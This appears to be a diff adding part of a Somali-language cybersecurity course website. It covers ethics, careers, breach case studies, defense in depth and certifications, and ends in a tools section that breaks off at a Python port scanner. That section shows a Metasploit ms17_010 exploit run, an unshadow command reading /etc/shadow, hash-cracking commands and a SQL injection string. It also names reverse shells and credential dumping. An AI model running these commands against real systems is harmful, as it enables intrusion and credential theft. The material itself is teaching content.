+      <div class="cbody">Mid ka mid ah caqabadaha ugu waaweyn waa in weerarro badan aan la ogaan muddo dheer — toddobaadyo ama bilooyin. Hay'ado badan ma ogaadaan in la jabsaday ilaa waqti danbe mooyee.<br><br>✅ La socodka joogtada ah firewalls, IPS, iyo IDS<br>✅ Ka Hortagga DDoS — load balancing, CDN, rate limiting<br>✅ NetFlow baseline — dhaqan caadi ah mid ka duwan ayaa digniin keenaya</div>
+    </div>
+    <div class="card">
+      <div class="ctit">🚨 CSIRT & Security Playbook</div>
+      <div class="cbody"><strong>CSIRT (Computer Security Incident Response Team)</strong> — Koox u xilsaaran inay wax ka qabato dhacdooyinka amniga marka ay dhacaan.<br><br><strong>Security Playbook</strong> — Dokumenti qeexaya tallaabooyinka la raacayo marka ay dhacdo nooc gaar ah oo weerar ah. Tusaale: maxaa la samaynayaa haddii la ogaado ransomware? In la haysto qorshe diyaarsan waxay dedejinaysaa jawaabta.</div>
+    </div>
+  </div>
+
+  <!-- BEST PRACTICES -->
+  <span class="slb" style="display:block">// HAB-DHAQANNADA AMNIGA UGU WANAAGSAN</span>
+  <div class="g3">
+    <div class="card"><div class="ctit">⚖️ Risk Assessment</div><div class="cbody">Si joogto ah u qiimee khataraha xogtaada dhijitaalka ah. <strong>Risk = Threat × Vulnerability × Impact.</strong> Khataraha muhiimka ah horena u xal. shirkaduhu waa in ay samaystaan risk register.</div></div>
+    <div class="card"><div class="ctit">📋 Siyaasadda Amniga</div><div class="cbody">Samee siyaasad cad oo qeexaysa shuruudaha amniga — cidda geli karta waxa, sida loola dhaqmayo xogta xasaasiga ah, iyo waxa dhacaya marka shardi la jebiyaa.</div></div>
+    <div class="card"><div class="ctit">🔄 Patch Management</div><div class="cbody">Si degdeg ah u rakib cusboonaysiinta amniga ee nidaamyada iyo barnaamijyada. <strong>Equifax 2017</strong> wuxuu ku dhacay sababtoo ah patch la daahiyay. Automatic updates hadduu macquul yahay.</div></div>
+    <div class="card"><div class="ctit">👤 Xakamaynta Gelitaanka</div><div class="cbody">Sii shaqaalaha oo kaliya gelitaanka ay u baahan yihiin si ay shaqadooda u qabsadaan — <strong>Principle of Least Privilege.</strong> RBAC (Role-Based Access Control) isticmaal.</div></div>
+    <div class="card"><div class="ctit">🎓 Tababarka Shaqaalaha</div><div class="cbody">Bar shaqaalaha sida loo aqoonsado khataraha sida phishing-ka, social engineering, iyo sida loola xiriiro IT-ga marka ay shaki qabaan. Dadka waa <strong>weakest link</strong> intooda badan.</div></div>
+    <div class="card"><div class="ctit">🔒 Siraynta Xogta</div><div class="cbody">Siree xogta xasaasiga ah — ha ahaato mid kaydsan (data at rest) ama mid socota (data in motion). HTTPS, TLS, iyo AES encryption waa hababka ugu muhiimsan.</div></div>
+  </div>
+</section>
+
+<!-- ════════════════════════════════════════
+  CUTUBKA 5: shuruudaha & ANSHAXA
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="c5">
+  <span class="slb">// CUTUBKA 5AAD</span>
+  <h2 class="stit">shuruuda, ANSHAXA & <span class="a2">XIRFADDA</span></h2>
+  <p class="sdesc">Cybersecurity experts waxay leeyihiin mas'uuliyad sharci iyo anshax ah. Farqiga u dhexeeya white hat iyo black hat waa sharciga ay ku dhex shaqeeyaan.</p>
+
+  <div class="g2" style="margin-bottom:1.5rem">
+    <div class="card">
+      <div class="ctit">⚖️ shuruuda</div>
+      <div class="cbody">
+        Inaad awood u leedahay inaad samayso shay <strong>macnaheedu maaha inay tahay inaad samayso.</strong><br><br>
+        Ku xadgudubka nidaamyada kombiyuutarrada ama shabakadaha dadka kale waa <strong>danbi </strong> — xitaa haddii ujeeddadaadu tahay inaad tijaabiso xirfadahaaga.<br><br>
+        <strong style="color:var(--ng)">Mas'uuliyaddaada:</strong> Waa inaad u isticmaashaa xirfadahaaga si aad u ilaaliso bulshada — adigoo mar walba ku shaqeynaya oggolaansho iyo qaab sharci ah.
+      </div>
+    </div>
+    <div class="card">
+      <div class="ctit">🤝 Anshaxa Shakhsi & Hay'adaha</div>
+      <div class="cbody">
+        Shay wuxuu noqon karaa mid sharci ahaan sax ah, laakiin <strong>anshax ahaan khaldan.</strong><br><br>
+        Su'aalaha aad is weydiinaayso ka hor ficil kasta:<br>
+        🟢 "Shareecada islaamka ma ii ogashahay inaa ficilkaan sameeyo?"<br>
+        🟢 "Miyaan jeclaan lahaa haddii mid kale uu igu sameeyo?"<br><br>
+        Haddii jawaabtaadu tahay <strong style="color:var(--rd)">MAYA</strong> — ha samaynin dadka kale.<br><br>
+        <strong>Hay'adaha:</strong> Mar walba raac siyaasadaha shirkaddaada. Inaad samayso go'aan anshax ahaan khaldan waxay dhaawici kartaa sumcaddaada.
+      </div>
+    </div>
+  </div>
+
+  <!-- SHAQOOYINKA -->
+  <span class="slb" style="display:block">// CYBERSECURITY CAREERS — SHAQOOYINKA</span>
+  <div class="g4">
+    <div class="card">
+      <div class="ctit">🔓 Ethical Hacker / PenTester</div>
+      <div class="cbody">Si sharci ah u "jabsado" nidaamyada shirkadda (oggolaansho haysta) si uu u helo meelaha daciifka ah. Aqoon ballaaran: barnaamijyo, shabakadaha, iyo nidaamyada OS.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">🔒 Security Administrator</div>
+      <div class="cbody">Mas'uul ka yahay rakibidda, habaynta, iyo maareynta qalabka amniga sida firewalls iyo IDS/IPS. Siyaasadaha amniga ee hay'adda dhexdeeda.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">🌐 Network Administrator</div>
+      <div class="cbody">Mas'uul ka yahay ilaalinta shabakadda — habaynta router-yada iyo switch-yada, iyo la socodka waxqabadka shabakadda si ammaan ah.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">💻 System Administrator</div>
+      <div class="cbody">Mas'uul ka yahay ilaalinta iyo maareynta server-yada shirkadda. OS updates, user management, iyo backup policies.</div>
+    </div>
+  </div>
+
+  <div class="ib" style="margin-top:1.2rem">💡 <div><strong>Talo:</strong> Cilmiga ma dhamaado — markasta isku day inaad xirfadaada kororosato. AI waxay kaa caawin kartaa koorse aad qaadan lahayd 6 bilood inaad ku dhamaysto 3 bilood. Waa garab kaa caawiya — ma aha beddelka dadaalkaaga.</div></div>
+</section>
+
+<!-- ════════════════════════════════════════
+  CUTUBKA 6: MUSTAQBALKA & AI
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="c6">
+  <span class="slb">// CUTUBKA 6AAD</span>
+  <h2 class="stit">MUSTAQBALKA AMNIGA & <span class="a1">GARAADKA MACMALKA</span> (AI)</h2>
+  <p class="sdesc">Dunida aan maanta ku noolnahay, Cyber Sphere waxay noqotay mid muhiim u ah nolosheena, ganacsiga, iyo amnigeena qaranka. AI wuxuu noqon doonaa seef laba af leh — difaac iyo weerar labadaba.</p>
+
+  <div class="g2" style="margin-bottom:1.5rem">
+    <div class="card">
+      <div class="ctit">🤖 AI ee Difaaca (Defensive AI)</div>
+      <div class="cbody">
+        Xirfadlayaasha amnigu waxay u isticmaali karaan AI si ay u falanqeeyaan xog aad u tiro badan oo ka timid shabakadaha:<br><br>
+        ✅ Ogaanshaha dhaqdhaqaaqyada aan caadiga ahayn si ka dhakhso badan aadanaha<br>
+        ✅ si Toos ah looga jawaabo khataraha, la xiro marinada<br>
+        ✅ La go'doomiyo nidaamyada la weeraray ka hor inta uusan khasaaruhu faafin<br><br>
+        <strong>Waxay la mid tahay:</strong> Ilaaliyeyaal  aan daalin oo si joogto ah u ilaalinaya nidaamyadaada.
+      </div>
+    </div>
+    <div class="card">
+      <div class="ctit">⚠️ AI ee Weerarka (Offensive AI)</div>
+      <div class="cbody">
+        Weeraryahannadu waxay sidoo kale ka faa'iidaysan karaan AI:<br><br>
+        🔴 Abuuranaan malware caqli badan oo is bedbeddeli kara si uu uga dhuunto AV<br>
+        🔴 Phishing weerarrada oo si gaar ah loogu talagalay shakhsiyaadka — data laga helay social media<br>
+        🔴 Si toos ah u raadiyaan una weeraraan meelaha nugul iyagoon u baahnayn faragelin<br><br>
+        Dagaalka mustaqbalka: AI vs AI — nidaamyada AI ee difaacaya vs kuwa weeraraya.
+      </div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card">
+      <div class="ctit">🌍 Ballaarashada Cyber Sphere (IoT & Big Data)</div>
+      <div class="cbody">Meelaha nugul (vulnerabilities) ay sii kordhayaan — qalab kasta oo internetka ku xiran wuxuu noqon karaa albaab laga soo galo. Laga soo bilaabo aaladaha smart-ka ee guryaha ilaa kaabayaasha muhiimka ah sida shabakadaha korontada — wax walba waxay ku xiran yihiin goobtan dhijitaalka ah.</div>
+    </div>
+    <div class="card">
+      <div class="ctit">🤝 Iskaashi Caalami ah & Wacyigelinta</div>
+      <div class="cbody">Caqabadaha amniga internetka waa kuwo caalami ah oo aan lahayn xuduud. Xalka:<br><br>✅ Iskaashi dhex mara shirkadaha — wadaag macluumaadka khataraha<br>✅ Wacyigelinta shaqaalaha — phishing, social engineering, link xun<br>✅ Shaqaalaha waa inay u wacaan IT-ga marka ay shaki qabtaan</div>
+    </div>
+  </div>
+</section>
+
+<!-- ════════════════════════════════════════
+  CUTUBKA 7: CASE STUDIES
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="c7">
+  <span class="slb">// CUTUBKA 7AAD</span>
+  <h2 class="stit">TUSAALOOYIN DHAB AH — <span class="a2">CASE STUDIES</span></h2>
+  <p class="sdesc">Saddex dhacdo oo waaweyn oo jabsasho amni ah oo saameyn weyn ku yeeshay malaayiin qof. Ka baro khaladaadka si aad uga fogaato mustaqbalka.</p>
+
+  <div class="csg">
+    <!-- LASTPASS -->
+    <div class="csc">
+      <div class="csh">
+        <div class="csh-yr">LUULYO 2015</div>
+        <div class="csh-n">⚔️ Jabsashadii LastPass</div>
+      </div>
+      <div class="csb">
+        <p><strong style="color:var(--cy)">Maxaa dhacay?</strong> Bishii Luulyo 2015, shirkadda LastPass waxay ogaatay in dad soo dhex-galay ay galeen shabakadooda. Tuugadu waxay awoodeen inay xadaan: ciwaannada email-ka, passwords, iyo authentication hashes.</p>
+        <p><strong style="color:var(--ng)">Maxay ku guuldareysteen?</strong> Kaydka erayada sirta ah (password vaults) ee isticmaaleyaasha. Sababtu: LastPass ay si adag u sireysay (client-side encryption) — shirkadduna aysan haysan erayada sirta ah ee asaasiga ah.</p>
+        <p><strong style="color:var(--ep)">Jawaabtii:</strong> Ka digtoonaanshaha phishing, beddelidda master password, iyo isticmaalka 2FA.</p>
+        <div class="csl">📚 CASHARKA: Xitaa shirkadaha diiradda saara amniga la jabsan karo. Client-side encryption waa difaac muhiim ah.</div>
+      </div>
+    </div>
+
+    <!-- VTECH -->
+    <div class="csc">
+      <div class="csh">
+        <div class="csh-yr">NOFEEMBAR 2015</div>
+        <div class="csh-n"> Jabsashadii VTech</div>
+      </div>
+      <div class="csb">
+        <p><strong style="color:var(--cy)">Maxaa dhacay?</strong> VTech (shirkad agabka carruurta) waxay la kulantay jabsasho saamaysay malaayiin carruur iyo waalidiintood. La xaday: magacyada, emails, passwords, sawirrada carruurta, iyo diiwaannada wada-hadalka.</p>
+        <p><strong style="color:var(--rd)">Guul-darrooyinkii:</strong> Shabakaddu ma isticmaalin SSL. Passwords waxaa lagu kaydiyay MD5 hash (duugoobay). Su'aalaha amniga waxaa lagu kaydiyay plain text — xog aan wax sirayn lahayn.</p>
+        <div class="csl">📚 CASHARKA: Mas'uuliyad weyn carruurta xogtooda. SSL, modern hashing (bcrypt/SHA-256), marnaba ha kaydin xog xasaasi ah qaab plain text ah.</div>
+      </div>
+    </div>
+
+    <!-- EQUIFAX -->
+    <div class="csc">
+      <div class="csh">
+        <div class="csh-yr">SEBTEMBAR 2017</div>
+        <div class="csh-n">💳 Jabsashadii Equifax</div>
+      </div>
+      <div class="csb">
+        <p><strong style="color:var(--cy)">Maxaa dhacay?</strong> Weeraryahannadu waxay ka faa'iideysteen nuglaansho ku jirtay Apache Struts. Intii u dhaxaysay May-Luulyo 2017, xadeen: magacyo, taariikhda dhalashada, ciwaanno, Social Security Numbers (150M+), iyo lambarrada shatiga.</p>
+        <p><strong style="color:var(--rd)">Sababta:</strong> Equifax ay ku guuldareysatay inay rakibto security patch la soo saaray. Jawaabtii sidoo kale ahayd musiibo — website ay abuureen dadku hubi karaan ayaa ahaa mid aan si fiican u shaqeynin.</p>
+        <div class="csl">📚 CASHARKA: Patch management degdeg ah waa qasab. Marka la helo nuglaansho la yaqaan, patch-ka isla marka badbaadi.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="wb" style="margin-top:1.2rem">
+    ⚠️ <div><strong>Guud ahaan:</strong> Saddexda dhacdodood waxay muujiyaan: (1) Encryption muhiimad sare, (2) Patch management lagama maarmaan, (3) Jawaabtii si degdeg ah — khasaaraha waxay sii kordhineysaa jawaabtii liidata.</div>
+  </div>
+</section>
+
+<!-- ════════════════════════════════════════
+  CUTUBKA 8: DEFENSE IN DEPTH
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="c8">
+  <span class="slb">// CUTUBKA 8AAD</span>
+  <h2 class="stit">DEFENSE IN DEPTH — <span class="a3">DIFAACA QOTO DHEER</span></h2>
+  <p class="sdesc">Fikraddani waxay ku saleysan tahay in aan hal qalab ama hal farsamo oo keliya lagu tiirsanaan karin. Waa in la dhisaa lakabyo badan oo amni oo isku dul yaal — haddii weeraryahanku ka soo gudbo mid, wuxuu la kulmaa mid labaad.</p>
+
+  <div class="did-layers">
+    <div class="did-l did-l-1">
+      <div class="did-lt">🔴 LAKABKA 1AAD — The Perimeter Layer (Safka Hore)</div>
+      <div class="did-ls">
+        Waa safka hore ee difaaca — dhammaan taraafikada ka imaanaysa dibadda (internetka) ee soo gelaysa shabakadda gudaha.<br><br>
+        <strong style="color:var(--rd)">Modern Firewalls:</strong> Network Layer + Application Layer + Proxy Server — isku-darka oo si wadajir ah u shaqeeya.<br>
+        <strong style="color:var(--rd)">IPS:</strong> Si firfircoon u falanqeeya nuxurka taraafikada si uu u raadiyo calaamadaha weerarrada — si toos ah u joojiyo.<br>
+        <strong style="color:var(--rd)">VPN:</strong> Shaqaalaha ka shaqeeya meel ka baxsan — marin sireysan oo aamin ah.
+      </div>
+    </div>
+    <div class="did-l did-l-2">
+      <div class="did-lt">🟡 LAKABKA 2AAD — The Internal Layer (Gudaha Shabakadda)</div>
+      <div class="did-ls">
+        Haddii weeraryahanku uu si uun uga soo gudbo lakabka hore — waa inuu la kulmaa difaacyo kale.<br><br>
+        <strong style="color:var(--gd)">Access Control + Least Privilege:</strong> Isticmaaleyaasha oo kaliya la siiyo gelitaanka ay si dhab ah ugu baahan yihiin. RBAC + 2FA.<br>
+        <strong style="color:var(--gd)">NetFlow Monitoring:</strong> Baseline la abuuro — dhaqan caadiyan. Wax kasta oo si weyn uga leexda digniin = server xog badan u diraya ciwaan aan la aqoon.
+      </div>
+    </div>
+    <div class="did-l did-l-3">
+      <div class="did-lt">🟢 LAKABKA 3AAD — The Endpoint & Data Layer (Qalabka & Xogta)</div>
+      <div class="did-ls">
+        Lakabkan ugu dambeeya — ilaalinta hantida ugu muhiimsan: qalabka iyo xogta lafteeda.<br><br>
+        <strong style="color:var(--ng)">AMP (Advanced Malware Protection):</strong> Behavior-based detection — falanqeeya dhaqanka faylasha, signature kaliya kuma filna.<br>
+        <strong style="color:var(--ng)">Data Encryption:</strong> Data at Rest (EFS, BitLocker) + Data in Motion (HTTPS, TLS, VPN).<br>
+        <strong style="color:var(--ng)">DLP (Data Loss Prevention):</strong> Looga hortago in xogta xasaasiga ah ay ka baxdo shabakadda — data in use, in motion, iyo at rest.
+      </div>
+    </div>
+  </div>
+
+  <div class="gb" style="margin-top:1.2rem">
+    ✅ <div><strong>Xusuusnow:</strong> Ma jiro hal xal. Amniga dhabta ahi wuxuu ka yimaadaa isku-darka xeeladaysan ee teknolojiyadda, siyaasadaha, iyo wacyigelinta joogtada ah.</div>
+  </div>
+
+  <!-- FIREWALL TYPES IN DETAIL -->
+  <span class="slb" style="margin-top:2rem;display:block">// FIREWALL TYPES — FAAHFAAHIN</span>
+  <div class="fwg">
+    <div class="fwc"><div class="fwt">Network Layer Firewall</div><div class="fws">Nooca ugu aasaasiga ah. Xogta ku kala shaandheeyaa ciwaannada IP-ga ee meesha ay ka timid iyo meesha ay u socoto. Packet filtering — fudud laakiin adag.</div></div>
+    <div class="fwc"><div class="fwt">Transport Layer Firewall</div><div class="fws">Ku daraa inuu xogta ku kala shaandheejo dekedaha (ports) iyo xaaladda isku xirka. Wuxuu la socon karaa isku xirka furan (stateful) — ka ammaan badan kii hore.</div></div>
+    <div class="fwc"><div class="fwt">Application Layer Firewall</div><div class="fws">Wuxuu fahmi karaa nooca barnaamijka ama adeegga xogta wada. Kala saari karaa taraafikada webka (HTTP) iyo tan faylasha (FTP). Deep packet inspection.</div></div>
+    <div class="fwc"><div class="fwt">Context-Aware Firewall</div><div class="fws">Nooc casri ah oo eega macluumaad dheeri ah sida isticmaalaha, qalabka, iyo goobta si uu go'aanno uga gaaro taraafikada. Next-gen firewall (NGFW).</div></div>
+    <div class="fwc"><div class="fwt">Proxy Server Firewall</div><div class="fws">Wuxuu u shaqeeyaa sidii dhexdhexaadiye u dhexeeya isticmaaleyaasha gudaha iyo internetka. Waxay shaandheyn karaan codsiyada webka waxayna qarin karaan IP-yada gudaha.</div></div>
+  </div>
+</section>
+
+<!-- ════════════════════════════════════════
+  CUTUBKA 9: XIRFADDA & SHAHAADOOYINKA
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="c9">
+  <span class="slb">// CUTUBKA 9AAD</span>
+  <h2 class="stit">HORUMARINTA XIRFADAHAAGA & <span class="a1">SHAHAADOOYINKA</span></h2>
+  <p class="sdesc">Si aad u noqoto xirfadle guulaysta oo dhinaca amniga internetka ah, waxaad u baahan tahay aasaas adag oo aqoon farsamo ah iyo shahaadooyin muujiya heerkaaga.</p>
+
+  <!-- AASAASKA AQOONTA -->
+  <span class="slb" style="display:block">// AASAASKA AQOONTA — MEELAHA LAGAMA MAARMAANKA AH</span>
+  <div class="g3" style="margin-bottom:1.5rem">
+    <div class="card"><div class="ctit">🌐 Networking</div><div class="cbody">Fahamka sida xogtu ugu dhex socoto shabakadaha. OSI Model, TCP/IP, DNS, DHCP, routing, VLANs, iyo protocols muhiimka ah. Wireshark si aad u aragto aragto.</div></div>
+    <div class="card"><div class="ctit">💻 Operating Systems</div><div class="cbody">Linux (Kali, Ubuntu) iyo Windows Server. Command line mastery — bash, PowerShell. File permissions, user management, iyo process monitoring.</div></div>
+    <div class="card"><div class="ctit">🔧 Applications</div><div class="cbody">Fahamka sida barnaamijyadu u shaqeeyaan iyo meelaha ay ka nugul yihiin. Web apps, databases, APIs, iyo sida looga faa'iideysto nuglaanshaha.</div></div>
+  </div>
+
+  <!-- SHAHAADOOYINKA -->
+  <span class="slb" style="display:block">// SHAHAADOOYINKA — CERTIFICATION ROADMAP</span>
+  <div class="ctt">
+    <div class="cti">
+      <div class="ctlv bg"> · BEGINNER</div>
+      <div class="ctn">CompTIA Security+</div>
+      <div class="ctf">CompTIA Security+ SY0-701</div>
+      <div class="cts">Certification-ka ugu caansan ee beginner. Waxay daboolaysaa: Threats & Attacks, Network Security, Cryptography, IAM, iyo Risk Management. Shaqo-bixiyayaashu way jeceshyhiin sababtoo ah vendor-neutral.<br><br><strong>Imtixaanka:</strong> 90 su'aalood, 90 daqiiqo, 750/900 guul. Vendor-neutral — wax kasta oo shirkad ah.</div>
+      <div class="ctsal">💰 Mushaharka caalamiga ah: $65,000–$90,000/sanad | Imtixaan: ~$400</div>
+    </div>
+    <div class="cti">
+      <div class="ctlv im">HEERKA DHEXE · INTERMEDIATE</div>
+      <div class="ctn">CEH — Certified Ethical Hacker</div>
+      <div class="ctf">EC-Council CEH v12</div>
+      <div class="cts">5 marxaladood oo hacking-ga: Reconnaissance, Scanning, Gaining Access, Maintaining Access, Clearing Tracks. 20 module oo kala duwan. Hacking tools dhammaanba waxaa lagu baranaa.</div>
+      <div class="ctsal">💰 Mushaharka caalamiga ah: $80,000–$120,000/sanad | Imtixaan: ~$950</div>
+    </div>
+    <div class="cti">
+      <div class="ctlv im">HEERKA DHEXE · INTERMEDIATE</div>
+      <div class="ctn">CySA+ — Cybersecurity Analyst</div>
+      <div class="ctf">CompTIA CySA+ CS0-003</div>
+      <div class="cts">SOC Analyst iyo Blue Team xirfadlaha ugu fiican certification. Threat detection, vulnerability management, incident response, iyo security analytics. SIEM, IDS, iyo threat hunting. Security+ ka dib bilaab.</div>
+      <div class="ctsal">💰 Mushaharka caalamiga ah: $75,000–$110,000/sanad | Imtixaan: ~$400</div>
+    </div>
+    <div class="cti">
+      <div class="ctlv av"> · ADVANCED</div>
+      <div class="ctn">OSCP — Offensive Security Certified Professional</div>
+      <div class="ctf">Offensive Security OSCP PEN-200</div>
+      <div class="cts">Penetration testing-ga ugu muhiimsan certification. <strong>24-saac imtixaan practical ah</strong> — machines gaar ah oo la "pwn" garaynaa. "Try Harder" waa mantradiisa. Lab waqti 90 cisho.<br><br>Shuruudaha: Linux basics, scripting, networking fundamentals. PWK course loo baahanyahay. Aad ayaa loo xushmeeya sababtoo ah wuu adag yahay.</div>
+      <div class="ctsal">💰 Mushaharka caalamiga ah: $100,000–$160,000/sanad | Course+Exam: ~$1,499</div>
+    </div>
+    <div class="cti">
+      <div class="ctlv ex">EXPERT</div>
+      <div class="ctn">CISSP — Certified Information Systems Security Professional</div>
+      <div class="ctf">ISC² CISSP</div>
+      <div class="cts">Heerka ugu sareysa cybersecurity management. 8 domain: Security & Risk Management, Asset Security, Security Architecture, Communication & Network Security, IAM, Security Assessment, Security Operations, iyo Software Development Security.<br><br><strong>Shuruudaha:</strong> 5 sano oo khibrad ah. CISO, Security Director, iyo xukumadaha sare.</div>
+      <div class="ctsal">💰 Mushaharka caalamiga ah: $120,000–$200,000+/sanad | Imtixaan: ~$749</div>
+    </div>
+  </div>
+
+  <!-- LEARNING RESOURCES -->
+  <span class="slb" style="margin-top:2rem;display:block">// QAAR KAMID AH MEELAHA LAGA BARTO OO KU SIIYA LABS</span>
+  <div class="rg">
+    <a href="https://tryhackme.com" target="_blank" rel="noopener" class="rc"><div class="re">🏠</div><div class="rn">TryHackMe</div><div class="rty">INTERACTIVE LABS</div><div class="rs">Kuwa bilawga ah uu ku fiican. Browser-ka kaliya. Qaab-dhismeedka wax-barasho ee guddiga, calaamado, iyo jid cad. Bilaash iyo premium.</div></a>
+    <a href="https://hackthebox.com" target="_blank" rel="noopener" class="rc"><div class="re">📦</div><div class="rn">Hack The Box</div><div class="rty">ADVANCED LABS</div><div class="rs">Heerka dhexe ilaa advance. Machines dhabta ah oo VPN ku xidhan. Shaqo-bixiyayaashu waxay eegaan HTB profile.</div></a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener" class="rc"><div class="re">🕷️</div><div class="rn">PortSwigger Academy</div><div class="rty">WEB SECURITY</div><div class="rs">Web security-ga ugu fiican platform-ka bilaashka ah. Burp Suite kuwa sameeyey ayaa leh website-kaann. SQL Injection, XSS, OWASP labs. 100% free.</div></a>
+    <a href="https://overthewire.org" target="_blank" rel="noopener" class="rc"><div class="re">⚔️</div><div class="rn">OverTheWire</div><div class="rty">WARGAMES</div><div class="rs">Linux skills iyo hacking bilaabashada ugu fiican. Bandit, Narnia, Leviathan. SSH ku xidha, command line baaro.</div></a>
+    <a href="https://www.cybrary.it" target="_blank" rel="noopener" class="rc"><div class="re">📚</div><div class="rn">Cybrary</div><div class="rty">COURSES & CERT PREP</div><div class="rs">Security+, CEH, OSCP diyaarinta. Video courses, practice labs, iyo mentorship. Bilaash tier la heli karo.</div></a>
+    <a href="https://www.vulnhub.com" target="_blank" rel="noopener" class="rc"><div class="re">🖥️</div><div class="rn">VulnHub</div><div class="rty">OFFLINE LABS</div><div class="rs">Machines kala duwan oo bilaash ah oo VirtualBox/VMware ku socdo. Internet ma u baahna. HTB practice-ka ugu wanaagsan.</div></a>
+  </div>
+
+  
+</section>
+
+<!-- ════════════════════════════════════════
+  TOOLS + SCRIPTING
+════════════════════════════════════════ -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="tools">
+  <span class="slb">// BONUS — TOOLS & SCRIPTING</span>
+  <h2 class="stit">TOOLS OF THE TRADE & <span class="a2">SCRIPTING</span></h2>
+  <p class="sdesc"> Halkaan waxaad baranaysaa 6-ta tool ugu caansan iyo luqadaha scripting ee muhiimka ah.</p>
+
+  <div class="tg" style="margin-bottom:2rem">
+    <div class="tc"><div class="th"><div class="tlo" style="background:rgba(0,245,255,.1);border:1px solid rgba(0,245,255,.2)">🗺️</div><div><div class="tn">NMAP</div><div class="tty">NETWORK MAPPER</div></div></div><div class="tso">Ports furan, OS nooca, services socda, iyo NSE scripts. Penetration testers iyo SOC analysts  isticmaala.</div><div class="tcmd">$ nmap -sV -sC -O 192.168.1.0/24
+$ nmap -p- --open -T4 target.com
+$ nmap --script vuln target.com</div></div>
+    <div class="tc"><div class="th"><div class="tlo" style="background:rgba(255,0,60,.1);border:1px solid rgba(255,0,60,.2)">💥</div><div><div class="tn">METASPLOIT</div><div class="tty">EXPLOITATION FRAMEWORK</div></div></div><div class="tso">2,000+ exploit, payload, encoder, iyo post-exploitation modules. msfconsole, msfvenom iyo Meterpreter.</div><div class="tcmd">msfconsole
+> use exploit/windows/smb/ms17_010
+> set RHOSTS 192.168.1.100
+> exploit</div></div>
+    <div class="tc"><div class="th"><div class="tlo" style="background:rgba(255,165,0,.1);border:1px solid rgba(255,165,0,.2)">🔧</div><div><div class="tn">BURP SUITE</div><div class="tty">WEB APP TESTING</div></div></div><div class="tso">HTTP proxy, request repeater, intruder (brute force), scanner. Bug bounty hunters dhammaan isticmaala.</div><div class="tcmd"># Proxy: 127.0.0.1:8080
+# IDOR: /user?id=1337 → id=1338
+# SQLi: id=1' OR '1'='1</div></div>
+    <div class="tc"><div class="th"><div class="tlo" style="background:rgba(0,100,255,.1);border:1px solid rgba(0,100,255,.2)">🦈</div><div><div class="tn">WIRESHARK</div><div class="tty">PACKET ANALYZER</div></div></div><div class="tso">Shabakadda traffic dhammaanba aragt. HTTP, DNS, FTP, TCP/UDP. SOC analysts iyo network engineers.</div><div class="tcmd">http.request.method == "POST"
+ip.addr == 192.168.1.100
+tcp.port == 443
+dns.qry.name contains "evil"</div></div>
+    <div class="tc"><div class="th"><div class="tlo" style="background:rgba(255,215,0,.1);border:1px solid rgba(255,215,0,.2)">🔑</div><div><div class="tn">JOHN THE RIPPER</div><div class="tty">PASSWORD CRACKER</div></div></div><div class="tso">Password hash-yada crack samaynta. Dictionary, brute force, iyo rule-based attacks. Linux /etc/shadow, NTLM, MD5.</div><div class="tcmd">$ john --wordlist=rockyou.txt hash.txt
+$ unshadow /etc/passwd /etc/shadow > un.txt
+$ john un.txt</div></div>
+    <div class="tc"><div class="th"><div class="tlo" style="background:rgba(191,0,255,.1);border:1px solid rgba(191,0,255,.2)">⚡</div><div><div class="tn">HASHCAT</div><div class="tty">GPU HASH CRACKER</div></div></div><div class="tso">GPU isticmaasha — billion+ hash per second. Mask attacks, combination attacks, iyo rule-based. John the Ripper ka xoog badan.</div><div class="tcmd">$ hashcat -m 0 -a 0 hash.txt rockyou.txt
+$ hashcat -m 1000 -a 3 hash.txt ?u?l?d?d
+# -m 0=MD5, -m 1000=NTLM, -m 1800=sha512</div></div>
+  </div>
+
+  <!-- SCRIPTING -->
+  <span class="slb" style="display:block">// SCRIPTING — LUQADAHA AUTOMATION-KA</span>
+  <div class="scg">
+    <div class="scc">
+      <div class="scl"> Python</div>
+      <div class="scr">THE HACKER'S LANGUAGE</div>
+      <div class="scs">Luqadda ugu jeclaan cybersecurity xirfadlayaasha. Sahlannaan iyo awood: network programming, web scraping, exploit development, cryptography. Libraries: Scapy, Requests, Paramiko, Socket.</div>
+      <div class="scuses"><span class="scu">Port Scanner</span><span class="scu">Keylogger</span><span class="scu">Network Sniffer</span><span class="scu">Web Scraper</span><span class="scu">Exploit Dev</span><span class="scu">API Testing</span></div>
+    </div>
+    <div class="scc">
+      <div class="scl">🐚 Bash</div>
+      <div class="scr">THE SYSTEM CONTROLLER</div>
+      <div class="scs">Luqadda Linux/Unix. Penetration testers waxay isticmaalaan si ay u automateeyaan scanning, enumeration, iyo post-exploitation tasks. Kali Linux waa aasaaskiisu.</div>
+      <div class="scuses"><span class="scu">Auto Recon</span><span class="scu">File Search</span><span class="scu">Log Parsing</span><span class="scu">Cron Jobs</span><span class="scu">Reverse Shell</span><span class="scu">Enum Scripts</span></div>
+    </div>
+    <div class="scc">
+      <div class="scl">⚡ PowerShell</div>
+      <div class="scr">THE WINDOWS WEAPON</div>
+      <div class="scs">Awood weyn Windows systems-yada. Red teamers: fileless malware, Active Directory enumeration, lateral movement, iyo bypass-ka antivirus. Living off the land (LOLBins).</div>
+      <div class="scuses"><span class="scu">AD Enum</span><span class="scu">Credential Dump</span><span class="scu">Fileless Attack</span><span class="scu">Bypass AV</span><span class="scu">Lateral Move</span><span class="scu">Empire C2</span></div>
+    </div>
+  </div>
+
+  <!-- PYTHON EXAMPLE -->
+  <div class="card" style="margin-top:1.3rem">
+    <div class="ctit">Python Port Scanner — Tusaale code</div>
+    <div class="tcmd" style="background:rgba(0,0,0,.5);border:1px solid rgba(0,255,65,.18);padding:1.1rem;border-radius:8px;font-family:var(--fm);font-size:.75rem;color:#e0ffe8;line-height:1.9;white-space:pre-wrap;margin-top:.75rem">#!/usr/bin/env python3
+# CyberBaro — Python Port Scanner
+
+
+import socket
+from datetime import datetime
+
